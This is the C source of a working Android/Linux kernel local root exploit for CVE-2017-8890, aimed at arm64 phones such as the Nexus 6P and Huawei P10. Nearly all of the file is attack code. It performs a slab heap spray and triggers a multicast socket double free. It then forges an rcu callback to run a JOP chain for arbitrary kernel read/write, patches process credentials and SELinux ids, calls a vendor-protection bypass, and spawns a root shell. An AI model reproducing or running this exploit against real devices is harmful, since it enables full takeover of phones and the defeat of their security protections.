/*
 * CVE-2017-8890 exploit adp args
 * used for arm64 like Nexus6P, HuaWeiP10, ...
 * Copyright (C) 2017 by idhyt3r@gmail.com
 * https://source.android.com/security/bulletin/2017-09-01
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <errno.h>
#include <pthread.h>
#include <sys/prctl.h>


/* ------------------ root define begin ------------------- */
#include "param.h"
#include "rootz.h"
#include "log.h"
#include "silly.h"
#include "fn.h"
#include "shell.h"
#include "roothelper.h"
#include "dict.h"

/* adp args */
static int adp_sn;
static unsigned long adp_init_task;
static unsigned long adp_task_security_offset;
static unsigned long adp_task_cred_uid_offset = 0x4;

static unsigned long adp_ptmx_fops;
static unsigned long adp_ptmx_kfunc_offset = 0xa8;
static unsigned long adp_patch_kfunc_jop;

/*
  初始化适配参数
*/

extern dict_t *transl_param_dict;

static int get_adp_ulval(char *name, unsigned long *value) {

  return dict_get_ulval(transl_param_dict, name, value);

}

static int get_adp_str(char *name, char *value, int len) {

  return dict_get_str(transl_param_dict, name, value, len);
}

static int rootz_before(int argc, char *argv[]) {
  // 设置日志路径, 不设置打印到控制台
  // set_logfile_path("/data/local/tmp/8890.log");
  // 适配参数初始化
  if (parse_args(argc, argv) < 0) {
    log_dump(LOG_ERR, "[-] parse_args failed\n");
    return -1;
  }

  if(!transl_param_dict) return -1;

  char *var;

  /* root before */
  if (!dict_get(transl_param_dict, n_sn, (void **)&var)) {
    log_dump(LOG_ERR, "[-] get n_sn failed\n");
    return -1;
  }
  adp_sn = atoi(var);
  log_dump(LOG_DEBUG, "adp_sn = %d\n", adp_sn);

  if(!get_adp_ulval(k_init_task, &adp_init_task)) return -1;
  if(!get_adp_ulval(k_task_security_offset, &adp_task_security_offset)) return -1;
  if(!get_adp_ulval(k_ptmx_fops, &adp_ptmx_fops)) return -1;
  if(!get_adp_ulval(k_ptmx_kfunc_offset, &adp_ptmx_kfunc_offset)) return -1;
  if(!get_adp_ulval(j_patch_kfunc_jop, &adp_patch_kfunc_jop)) return -1;

#if 1
  printf(" adp_init_task = 0x%lx\n", adp_init_task);
  printf(" adp_task_security_offset = 0x%lx\n", adp_task_security_offset);
  printf(" adp_ptmx_fops = 0x%lx\n", adp_ptmx_fops);
  printf(" adp_ptmx_kfunc_offset = 0x%lx\n", adp_ptmx_kfunc_offset);
  printf(" adp_patch_kfunc_jop = 0x%lx\n", adp_patch_kfunc_jop);
#endif


  return 0;
}

/*
  提权过后的操作
*/

static int rootz_after() {
  if(transl_param_dict) {
    vendor_protect_bypass(transl_param_dict);
    silly_everything_after_root(transl_param_dict);
  }

  if(transl_param_dict) {
    dict_destory(transl_param_dict);
    free(transl_param_dict);
  }

  return 0;
}


/* ------------------ root define end ------------------- */

#ifndef ONE_IGMP_H 
#define ONE_IGMP_H

#define __rcu

struct callback_head {
  struct callback_head *next;
  void (*func)(struct callback_head *head);
};
#define rcu_head callback_head

struct ip_sf_socklist {
  unsigned int  sl_max;
  unsigned int  sl_count;
  struct rcu_head   rcu;
  __be32    sl_addr[0];
};

struct ip_mc_socklist {
  struct ip_mc_socklist __rcu *next_rcu;
  struct ip_mreqn   multi;
  unsigned int  sfmode;   /* MCAST_{INCLUDE,EXCLUDE} */
  struct ip_sf_socklist __rcu *sflist;
  struct rcu_head   rcu;
};
#endif // ONE_IGMP_H

#ifndef _UAPI_LINUX_IN_H
#define _UAPI_LINUX_IN_H

struct ip_msfilter {
  __be32    imsf_multiaddr;
  __be32    imsf_interface;
  __u32   imsf_fmode;
  __u32   imsf_numsrc;
  __be32    imsf_slist[1];
};

#define MCAST_INCLUDE 1
#define MCAST_EXCLUDE 0

#endif


/*
  for debug macros
*/
// #define __TEST_ARGS
#define __BIND_CPU
#define __HEAP_SPRAY
#define __HEAP_SPRAY_PAD
#define __CLEAN_LOGS

#define rcu_head_offset sizeof(struct ip_mc_socklist) - sizeof(struct rcu_head)

// used for trigger vul
static int PORT = 10086;
static int server_init = 0;
static int server_finish = 0;
static int client_finish = 0;
static int conntfd[2] = { 0 };
static int connect_times = 2;

// used for heap spray
static int g_spray_imsf_numsrc = 0;
static struct sockaddr_in g_spray_gr_si = { 0 };
static struct group_req g_spray_group = { 0 };
static char * g_spray_buf = NULL;
static int g_spray_buf_len = sizeof(struct ip_mc_socklist);
static int g_spray_times = 0x800;
static int g_spray_pad_times = 0x100;
static int g_spray_sockfd[0x1000];
static int g_per_im_times = 0x20;
static int g_spray_port = 20022;
static int g_s_addr_base = 0x000000e0;  // 224.0.0.0 __be32

#define get_imsf_numsrc(t_size) (int)((t_size - sizeof(struct ip_sf_socklist)) / sizeof(int))
#define get_control_head_addr(nums) (unsigned long)(nums * 0x100000000)

// used for bind cpu
extern volatile int bind_cpu_id;

// used for mmap addr
static unsigned long g_fake_iml_next_rcu = 0UL;

static unsigned long g_jop_set_buf = 0x0c000000UL;

static int g_mmap_size = 0x1000;

static unsigned long g_check_rwcap_value = (unsigned long)0xdeadbeefdeadbeef;


#ifdef __HEAP_SPRAY

static int slab_heap_spray_init() {

  int i, j, ret;
  int spray_len;

  // init MCAST_JOIN_GROUP data
  g_spray_gr_si.sin_family = AF_INET;
  g_spray_gr_si.sin_port = htons(g_spray_port);
  g_spray_gr_si.sin_addr.s_addr = g_s_addr_base;
  g_spray_group.gr_interface = 1;
  memcpy(&g_spray_group.gr_group, &g_spray_gr_si, sizeof(g_spray_gr_si));


  // init IP_MSFILTER data
  g_spray_buf = malloc(g_spray_buf_len + 1);
  memset(g_spray_buf, 0, g_spray_buf_len + 1);

  struct ip_msfilter * msf = (struct ip_msfilter *)g_spray_buf;

  msf->imsf_multiaddr.s_addr = g_s_addr_base;
  msf->imsf_interface.s_addr = inet_addr("127.0.0.1");
  msf->imsf_fmode = MCAST_EXCLUDE;
  msf->imsf_numsrc = g_spray_imsf_numsrc; 
  msf->imsf_slist[0].s_addr = 0;

  for (i = 0; i < g_spray_times; ++i) {
    errno = 0;
    g_spray_sockfd[i] = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC , IPPROTO_IP);
    if(g_spray_sockfd[i] < 0) {
      log_dump(LOG_ERR, "[-] (%d) socket() failed, errno = %d, msg = %s\n", i, errno, strerror(errno));
      return -1;
    }

    for(j = 0; j < g_per_im_times; ++j) {
      g_spray_gr_si.sin_addr.s_addr = g_s_addr_base + (j*0x100);
      memcpy(&g_spray_group.gr_group, &g_spray_gr_si, sizeof(g_spray_gr_si));

      errno = 0;
      ret = setsockopt(g_spray_sockfd[i], SOL_IP, MCAST_JOIN_GROUP, &g_spray_group, sizeof(g_spray_group));
      if(ret == 0) {
        continue;
      } else
      if((ret < 0) && (errno == 105)) {
      #ifndef __CLEAN_LOGS
        log_dump(LOG_ERR, "[-] (%d:%d) setsockopt(MCAST_JOIN_GROUP) failed!, errno = %d, msg = %s\n", i, j, errno, strerror(errno));
      #endif
        break;
      } else {
        log_dump(LOG_ERR, "[-] (%d:%d) setsockopt(MCAST_JOIN_GROUP) failed!, ret = %d, errno = %d, msg = %s\n", i, j, ret, errno, strerror(errno));
        return -1;
      }
    #if 0
      msf->imsf_multiaddr.s_addr = g_s_addr_base + (j*0x100);
      errno = 0;
      ret= setsockopt(g_spray_sockfd[i], IPPROTO_IP, IP_MSFILTER, msf, 48);

      if(ret < 0) {
        log_dump(LOG_ERR, "[-] (%d:%d) slab_heap_spray failed! errno = %d, msg = %s\n", i, j, errno, strerror(errno));
        return -1;
      }
    #endif
    }
  }

  return 0;

}

#else

static int slab_heap_spray_init() {
  return 0;
}

#endif


static void *th_client_connect(void *arg) {
#ifdef __BIND_CPU
  bind_thread_on_cpu(bind_cpu_id);
#endif

  int sockfd, i;
  struct sockaddr_in si = { 
    .sin_family = AF_INET, 
    .sin_port = htons(PORT),
    .sin_addr = inet_addr("127.0.0.1"),
  };

  while(!server_init)
    usleep(1);

  log_dump(LOG_DEBUG, "accept times %d\n", connect_times);

  for ( i = 0 ; i < connect_times ; i++ ) {
    sockfd = socket(AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP);

    if (connect(sockfd, (struct sockaddr*)&si, sizeof(si)) != 0 ) {
      log_dump(LOG_ERR, "[-] client-%d connected failed.\n", i);
    }
    close(sockfd);
  }
  client_finish = 1;
  while(1) {}
  pthread_exit(0);
}

static int trigger() {
  int i, j, ret;

  struct ip_msfilter * msf = (struct ip_msfilter *)g_spray_buf;

  int server_sockfd;

  server_sockfd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC , IPPROTO_IP);

  struct sockaddr_in gr_si = { 
    .sin_family = AF_INET, 
    .sin_port = htons(PORT),
    .sin_addr = inet_addr("224.0.0.0"), // multicast address
  };

  struct group_req group;
  group.gr_interface = 1;
  memcpy(&group.gr_group, &gr_si, sizeof(gr_si));

  errno = 0;
  if (setsockopt(server_sockfd, SOL_IP, MCAST_JOIN_GROUP, &group, sizeof(group)) < 0) {
    log_dump(LOG_ERR, "[-] setsockopt(MCAST_JOIN_GROUP) failed!, errno = %d, msg = %s\n", errno, strerror(errno));
    return -1;
  }

  struct sockaddr_in serv_addr = {};
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(PORT);
  serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

  bind(server_sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

  listen(server_sockfd, 2);
  
  pthread_t th_client;
  // Create a client thread to connect.
  if ( pthread_create(&th_client, NULL, th_client_connect, NULL))
    log_dump(LOG_DEBUG,"[-] th_client_connect failed.\n");

  server_init = 1;
  for ( i = 0 ; i < connect_times ; i++ ) {
    conntfd[i] = accept4(server_sockfd, NULL, NULL, 0);

    if(conntfd[i] >= 0 ) {
      log_dump(LOG_DEBUG,"[+] accept() succeed.\n");
    } else {
      log_dump(LOG_DEBUG,"[-] accept() failed.\n");
      return -1;
    }
  }

  while(!client_finish)
    usleep(1);

  server_finish = 1;

#ifdef __HEAP_SPRAY
  #ifdef __HEAP_SPRAY_PAD
  log_dump(LOG_DEBUG,"[!] %d times to spray for the padding.\n", g_spray_pad_times);

  for (i = 0; i < g_spray_pad_times; ++i) {
    for(j = 0; j < g_per_im_times; ++j) {
      msf->imsf_multiaddr.s_addr = g_s_addr_base + (j*0x100);
      errno = 0;
      // ret = slab_heap_spray(g_spray_sockfd[i], g_spray_buf, g_spray_buf_len);
      ret= setsockopt(g_spray_sockfd[i], IPPROTO_IP, IP_MSFILTER, g_spray_buf, g_spray_buf_len);
      if(ret < 0) {
      #ifndef __CLEAN_LOGS
        log_dump(LOG_ERR, "[-] (%d:%d) slab_heap_spray failed! ret = %d, errno = %d, msg = %s\n", i, j, ret, errno, strerror(errno));
        // return -1;
        break;
      #endif
      }
    }
  }
  #endif
#endif

  // first free...
  log_dump(LOG_DEBUG,"[!] first free mc_list obj.\n");
  if (conntfd[0] ) 
    close(conntfd[0]);

#ifdef __HEAP_SPRAY

  log_dump(LOG_DEBUG,"[!] %d times to spray for the hole.\n", g_spray_times - g_spray_pad_times);

  for(i = g_spray_pad_times; i < g_spray_times; ++i) {
    for(j = 0; j < g_per_im_times; ++j) {
      msf->imsf_multiaddr.s_addr = g_s_addr_base + (j*0x100);
      errno = 0;
      ret= setsockopt(g_spray_sockfd[i], IPPROTO_IP, IP_MSFILTER, g_spray_buf, g_spray_buf_len);
      if(ret < 0) {
      #ifndef __CLEAN_LOGS
        log_dump(LOG_ERR, "[-] (%d:%d) slab_heap_spray failed! ret = %d, errno = %d, msg = %s\n", i, j, ret, errno, strerror(errno));
        // return -1;
        break;
      #endif
      }
    }
  }
#endif

  struct rcu_head* head = (void*)(g_fake_iml_next_rcu + g_spray_imsf_numsrc + rcu_head_offset);
  log_dump(LOG_DEBUG,"[*] close(conntfd[1] before: head->next : %p, head->func = %p\n", head->next, head->func);

  log_dump(LOG_DEBUG,"[!] secound free mc_list obj.\n");
  if ( connect_times != 1 )
    close(conntfd[1]);

  log_dump(LOG_DEBUG,"[*] close(conntfd[1] after: head->next : %p, head->func = %p\n", head->next, head->func);

  while(1) {
    if ( head->next ) {
      head->func = (void*) adp_patch_kfunc_jop;
      break;
    }
  }
  log_dump(LOG_DEBUG,"[+] head->next : %p, &head->func = 0x%lx, head->func = %p\n", head->next, &head->func, head->func);

  return 0;
}

static int call_check_flags(char * arg) {
  int fd, ret;

  errno = 0;
  fd = open("/dev/ptmx", O_RDWR, 0);
  if (fd < 0) {
    log_dump(LOG_ERR, "[-] open false, errno = %d, msg = %s\n", errno, strerror(errno));
    return -1;
  }

  errno = 0;
  ret = fcntl(fd, F_SETFL, arg);
  if (ret < 0) {
    log_dump(LOG_ERR, "[-] ioctl false, ret = 0x%lx, errno = %d, msg = %s\n", ret, errno, strerror(errno));
    return -1;
  } else {
    log_dump(LOG_DEBUG, "[+] ioctl succeed, ret = 0x%lx, errno = %d, msg = %s\n", ret, errno, strerror(errno));
  }

  return 0;
}

static void setup_rwcap_jop(char *jop_buf) {
  int i;
  for (i = 0; i < 0x10; ++i) {
    if (j_jop2[i].index == 0 && j_jop2[i].addr == 0)
      break;
    if (j_jop2[i].addr == 0xaaaaaaaa)
      *((unsigned long *)(jop_buf + j_jop2[i].index)) = (unsigned long )(jop_buf);
    else
      *((unsigned long *)(jop_buf + j_jop2[i].index)) = j_jop2[i].addr;
  }
}


static int mmap_addr_init() {
  unsigned long ret;

  errno = 0;
  ret = (unsigned long)mmap((void *)g_jop_set_buf, g_mmap_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
  if (ret != g_jop_set_buf) {
    log_dump(LOG_ERR, "[-] mmap 0x%lx false, ret = 0x%lx, errno = %d, msg = %s\n", g_jop_set_buf, ret, errno, strerror(errno));
    return -1;
  }
  memset((void *)g_jop_set_buf, 0, g_mmap_size);

  g_spray_imsf_numsrc = get_imsf_numsrc(g_spray_buf_len);
  if(!g_spray_imsf_numsrc) {
    log_dump(LOG_ERR, "[-] get_imsf_numsrc(0x%x) error!\n", g_spray_buf_len);
    return -1;
  }

  g_fake_iml_next_rcu = get_control_head_addr(g_spray_imsf_numsrc);
  if(!g_fake_iml_next_rcu) {
    log_dump(LOG_ERR, "[-] get_control_head_addr(0x%x) error!\n", g_spray_imsf_numsrc);
    return -1;
  }

  log_dump(LOG_DEBUG, "[+] g_spray_imsf_numsrc = 0x%x, g_fake_iml_next_rcu = 0x%lx\n", g_spray_imsf_numsrc, g_fake_iml_next_rcu);

  errno = 0;
  ret = (unsigned long)mmap((void *)g_fake_iml_next_rcu, g_mmap_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
  if (ret != g_fake_iml_next_rcu) {
    log_dump(LOG_ERR, "[-] mmap 0x%lx false, ret = 0x%lx, errno = %d, msg = %s\n", g_fake_iml_next_rcu, ret, errno, strerror(errno));
    return -1;
  }
  memset((void *)g_fake_iml_next_rcu, 0, g_mmap_size);

  return 0;
}


static int fake_iml_obj_init() {
  int i;
  unsigned long fake_kernel_func, rwcap_kfunc;

  fake_kernel_func = adp_ptmx_fops + adp_ptmx_kfunc_offset;

  struct ip_mc_socklist *iml = (void*)(g_fake_iml_next_rcu + g_spray_imsf_numsrc);

  char *jop_buf = (void*)&iml->rcu.next;
  log_dump(LOG_DEBUG, "[!] jop_buf = %p\n", jop_buf);

  for (i = 0; i < 0x10; ++i) {
    if (j_jop1[i].index == 0 && j_jop1[i].addr == 0)
      break;
    if (j_jop1[i].addr == 0xaaaaaaaa)
      *((unsigned long *)(jop_buf + j_jop1[i].index)) = (unsigned long )(jop_buf);
    else if (j_jop1[i].addr == 0xaaaabbbb)
      *((unsigned long *)(jop_buf + j_jop1[i].index)) = (unsigned long )(fake_kernel_func - 0xf8);
    else if (j_jop1[i].addr == 0xbbbbbbbb)
      *((unsigned long *)(jop_buf + j_jop1[i].index)) = (unsigned long )(fake_kernel_func - 8);
    else if (j_jop1[i].addr == 0xcccccccc)
      *((unsigned long *)(jop_buf + j_jop1[i].index)) = (unsigned long )(jop_buf + 0x100);
    else if (j_jop1[i].addr == 0xdddddddd)
      *((unsigned long *)(jop_buf + j_jop1[i].index)) = (unsigned long )(jop_buf + 0x200);
    else if (j_jop1[i].addr == 0xeeeeeeee)
      *((unsigned long *)(jop_buf + j_jop1[i].index)) = (unsigned long )(jop_buf + 0x300);
    else if (j_jop1[i].addr == 0xffffffff)
      *((unsigned long *)(jop_buf + j_jop1[i].index)) = (unsigned long )(fake_kernel_func - 0x20);
    else
      *((unsigned long *)(jop_buf + j_jop1[i].index)) = j_jop1[i].addr;
  }

  iml->next_rcu = (void*) NULL;
  iml->rcu.next = (void*) NULL;
  iml->rcu.func = (void*) NULL;

  log_dump(LOG_DEBUG, "[+] jop_buf = %p, iml = %p, &(iml->rcu.next) = %p\n", jop_buf, (void*)iml, &(iml->rcu.next));

  return 0;

}

static int init_global_data() {

  if(set_fd_limit_max() < 0) return -1;

  if(mmap_addr_init() < 0) return -1;

  if(slab_heap_spray_init() < 0) return -1;

  if(fake_iml_obj_init() < 0) return -1;


  log_dump(LOG_DEBUG, "all global value initialize success.\n");

  return 0;
}


static int exploit_slab64(int argc, char *argv[]) {
  log_dump(LOG_NORMAL, "\t[1] padding data to fake obj.\n");
  if(init_global_data() < 0) return -1;

  log_dump(LOG_NORMAL, "\t[3] trigger exploit.\n");
  if (trigger() < 0 )
    log_dump(LOG_ERR, "[-] trigger failed.\n");

  log_dump(LOG_DEBUG, "[!] setup patch rwcap jop\n");
  setup_rwcap_jop((char *)g_jop_set_buf);

  log_dump(LOG_DEBUG, "[!] dangerous! test rwcap!\n");
  sleep(1);

  unsigned long value = 0;
  while (1) {
    call_check_flags((char *)g_jop_set_buf);
    if (pipe_read_memory((void*)adp_ptmx_fops, (void*)&value, sizeof(value)) == sizeof(value)) {
      log_dump(LOG_NORMAL, "[+] cat arbitrary read/write succeeded 0x%lx = 0x%lx\n", adp_ptmx_fops, value);
      break;
    }
    usleep(300 * 1000);
  }


  log_dump(LOG_NORMAL, "\t[5] get root, patch cred & sid\n");
  
  char random_name[0x10] = { 0 };
  set_random_task_name(4, random_name);

  obtain_root_by_task_name(adp_init_task, random_name, adp_task_security_offset, adp_task_cred_uid_offset);

  log_dump(LOG_DEBUG, "\t[!] patch memory for something.\n");

  patch_memory(1, p_patch);

  return 0;

}

static void for_jop_remind() {
  /*
  struct ip_mc_socklist {
    struct ip_mc_socklist __rcu *next_rcu;
    struct ip_mreqn   multi;
    unsigned int  sfmode;
    struct ip_sf_socklist __rcu *sflist;
    struct rcu_head   rcu;
  };

*/
  printf("---------- remind for jop offset! ----------\n");
  struct ip_mc_socklist * imsk = (struct ip_mc_socklist *) malloc(sizeof(struct ip_mc_socklist));
  printf("next_rcu offset = 0x%lx\n", (unsigned long)&imsk->next_rcu - (unsigned long)imsk);
  printf("multi offset = 0x%lx\n", (unsigned long)&imsk->multi - (unsigned long)imsk);
  printf("sfmode offset = 0x%lx\n", (unsigned long)&imsk->sfmode - (unsigned long)imsk);
  printf("sflist offset = 0x%lx\n", (unsigned long)&imsk->sflist - (unsigned long)imsk);
  printf("rcu->next offset = 0x%lx, forbid!\n", (unsigned long)&imsk->rcu.next - (unsigned long)imsk);
  printf("rcu->func offset = 0x%lx, forbid!\n", (unsigned long)&imsk->rcu.func - (unsigned long)imsk);
  printf("---------- end! ----------\n");
}


void test(int argc, char *argv[]) {
  for_jop_remind();
  // parse_args(argc, argv);
  rootz_before(argc, argv);
  rootz_after();

  printf("ip_mc_socklist = 0x%x\n", (int)sizeof(struct ip_mc_socklist));
  printf("ip_msfilter = 0x%x,ip_sf_socklist = 0x%x, %d, get_control_head_addr=0x%lx\n", (int)sizeof(struct ip_msfilter), (int)sizeof(struct ip_sf_socklist), get_imsf_numsrc(0x30), get_control_head_addr(get_imsf_numsrc(0x30)));

  struct ip_mc_socklist iml = { 0 };

  int next_rcu_offset = (char *)&(iml.next_rcu) - (char *)&iml;

  int rcu_next_offset = (char *)&(iml.rcu.next) - (char *)&iml;
  int rcu_func_offset = (char *)&(iml.rcu.func) - (char *)&iml;
  printf("offset for next_rcu = 0x%x, rcu.next = 0x%x, rcu.func = 0x%x\n", next_rcu_offset, rcu_next_offset, rcu_func_offset);


  exit(0);
}

int main(int argc, char *argv[]) {
#ifdef __TEST_ARGS
  test(argc, argv);
#endif

#ifdef __BIND_CPU
  set_bind_cpu_id();
  bind_process_on_cpu(bind_cpu_id);
#endif

  if(rootz_before(argc, argv)) {
    log_dump(LOG_ERR, "[-] rootz_before failed!\n");
    return -1;
  }

  if (adp_sn != 103) {
    log_dump(LOG_ERR, "[-] adp sn error!\n");
    return -1;
  }

  log_dump(LOG_NORMAL, "\t[*] start, pid: %d, tid: %d, uid: %d, gid: %d\n", getpid(), gettid(), getuid(), getgid());

  exploit_slab64(argc, argv);

  log_dump(LOG_NORMAL, "\t[*] end, pid: %d, tid: %d, uid: %d, gid: %d\n", getpid(), gettid(), getuid(), getgid());

  if(rootz_after()) {
    log_dump(LOG_ERR, "[-] rootz_after failed!\n");
  }

  fprintf(stderr, "end...\n");

  system("USER=ROOT /system/bin/sh");

  printf("hang up...\n");


  while(1);

  return 0;
}
